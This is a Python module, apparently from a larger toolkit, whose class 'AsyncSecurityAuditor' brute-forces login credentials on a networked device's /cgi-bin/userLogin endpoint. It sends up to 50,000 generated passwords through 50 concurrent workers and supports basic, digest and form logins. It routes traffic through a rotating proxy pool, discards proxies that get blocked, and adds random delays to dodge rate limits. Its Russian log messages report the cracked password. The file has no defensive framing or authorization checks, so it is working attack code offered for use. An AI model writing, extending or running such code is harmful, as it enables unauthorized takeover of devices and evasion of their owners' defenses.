import asyncio
import logging
import random
from typing import Optional, Callable
from dataclasses import dataclass
import aiohttp
from aiohttp import BasicAuth, ClientTimeout
from aiohttp_digest_auth import DigestAuth

from .async_proxy import AsyncProxyPool, ProxyNode
from .password_gen import PasswordGenerator
from .vuln_check import TargetDevice

logger = logging.getLogger("AsyncAuditor")

@dataclass
class AuditAttempt:
    success: bool
    password: str
    proxy: ProxyNode
    response_time: float
    status_code: int

class AsyncSecurityAuditor:
    def __init__(self,
                 target: TargetDevice,
                 proxy_pool: AsyncProxyPool,
                 password_gen: PasswordGenerator,
                 username: str = 'admin',
                 auth_type: str = 'basic',
                 concurrency: int = 50,
                 log_callback: Optional[Callable] = None):
        self.target = target
        self.proxy_pool = proxy_pool
        self.password_gen = password_gen
        self.username = username
        self.auth_type = auth_type
        self.concurrency = concurrency
        self.log = log_callback or logger.info
        self.stop_event = asyncio.Event()
        self.found_password = None

    def _get_url(self) -> str:
        scheme = "https" if self.target.ssl else "http"
        return f"{scheme}://{self.target.ip}:{self.target.port}/cgi-bin/userLogin"

    async def _producer(self, queue: asyncio.Queue):
        for pwd in self.password_gen.generate(limit=50000):
            if self.stop_event.is_set():
                break
            await queue.put(pwd)
        for _ in range(self.concurrency):
            await queue.put(None)

    async def _try_auth(self, password: str, proxy: ProxyNode, session: aiohttp.ClientSession) -> tuple[bool, int]:
        url = self._get_url()
        proxy_url = proxy.url if proxy else None
        timeout = ClientTimeout(total=8)
        try:
            if self.auth_type == 'basic':
                auth = BasicAuth(self.username, password)
                async with session.get(url, auth=auth, proxy=proxy_url, timeout=timeout) as resp:
                    return resp.status == 200, resp.status
            elif self.auth_type == 'digest':
                auth = DigestAuth(self.username, password)
                async with session.get(url, auth=auth, proxy=proxy_url, timeout=timeout) as resp:
                    return resp.status == 200, resp.status
            else:  # form
                data = {'username': self.username, 'password': password}
                async with session.post(url, data=data, proxy=proxy_url, timeout=timeout) as resp:
                    return resp.status == 200, resp.status
        except Exception as e:
            self.log(f"Ошибка с прокси {proxy.url if proxy else 'none'}: {e}")
            return False, 0

    async def _worker(self, worker_id: int, queue: asyncio.Queue, session: aiohttp.ClientSession):
        while not self.stop_event.is_set():
            pwd = await queue.get()
            if pwd is None:
                queue.task_done()
                break

            proxy = await self.proxy_pool.get_best_proxy()
            if not proxy:
                await queue.put(pwd)
                await asyncio.sleep(1)
                queue.task_done()
                continue

            success, status = await self._try_auth(pwd, proxy, session)
            if success:
                self.log(f"[+] УСПЕХ! Пароль: {pwd}")
                self.found_password = pwd
                self.stop_event.set()
                queue.task_done()
                break
            else:
                if status in (403, 429):
                    await self.proxy_pool.report_failure(proxy.url)
                self.log(f"[-] {pwd} не подходит (код {status})")
                queue.task_done()
                await asyncio.sleep(random.uniform(0.3, 1.0))

    async def run(self) -> Optional[str]:
        connector = aiohttp.TCPConnector(limit=self.concurrency, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            await self.proxy_pool.refresh_pool(session)
            queue = asyncio.Queue(maxsize=self.concurrency * 2)
            producer = asyncio.create_task(self._producer(queue))
            workers = [asyncio.create_task(self._worker(i, queue, session)) for i in range(self.concurrency)]
            await asyncio.gather(producer, *workers, return_exceptions=True)
            self.stop_event.set()
            for w in workers:
                w.cancel()
        return self.found_password
